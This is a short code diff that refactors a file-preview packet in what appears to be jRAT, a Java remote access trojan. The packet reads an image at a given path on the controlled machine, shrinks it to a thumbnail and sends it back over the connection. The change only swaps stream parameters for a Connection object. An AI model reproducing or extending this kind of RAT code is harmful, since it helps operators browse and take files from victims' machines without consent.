@@ -1,12 +1,11 @@
 package jrat.module.fs.packets;
 
+import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
-import jrat.common.io.StringWriter;
 import jrat.common.utils.ImageUtils;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
-import java.io.DataOutputStream;
 import java.io.File;
 
 public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
@@ -18,16 +17,16 @@ public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(file);
+	public void write(Connection con) throws Exception {
+        con.writeLine(file);
 
 		BufferedImage image = ImageIO.read(new File(file));
 		image = ImageUtils.resize(image, 150, 100);
 
 		byte[] buffer = ImageUtils.encode(image);
 
-		dos.writeInt(buffer.length);
-		dos.write(buffer);
+        con.writeInt(buffer.length);
+        con.write(buffer);
 	}
 
 	@Override
